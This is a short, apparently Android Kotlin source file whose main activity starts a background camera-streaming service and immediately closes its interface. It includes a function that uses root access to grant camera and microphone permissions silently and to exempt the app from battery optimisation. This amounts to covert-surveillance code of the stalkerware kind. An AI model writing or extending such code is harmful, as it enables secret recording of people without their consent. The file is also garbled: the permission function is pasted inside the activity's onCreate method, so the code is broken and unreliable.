package com.example

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import com.example.service.CameraStreamService

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Start background streaming service
        val serviceIntent = Intent(this, CameraStreamService::class.java)
        startService(serviceIntent)

        // 2. Immediately close the UI on the camera phone

fun grantPermissionsSilently(packageName: String) {
    try {
        val process = Runtime.getRuntime().exec("su")
        val os = java.io.DataOutputStream(process.outputStream)
        
        // Grant Camera and Audio permissions
        os.writeBytes("pm grant $packageName android.permission.CAMERA\n")
        os.writeBytes("pm grant $packageName android.permission.RECORD_AUDIO\n")
        
        // Disable Battery Optimization
        os.writeBytes("dumpsys deviceidle whitelist +$packageName\n")
        
        os.writeBytes("exit\n")
        os.flush()
        process.waitFor()
    } catch (e: Exception) {
        e.printStackTrace()
    }
}        
        finish()
    }
}
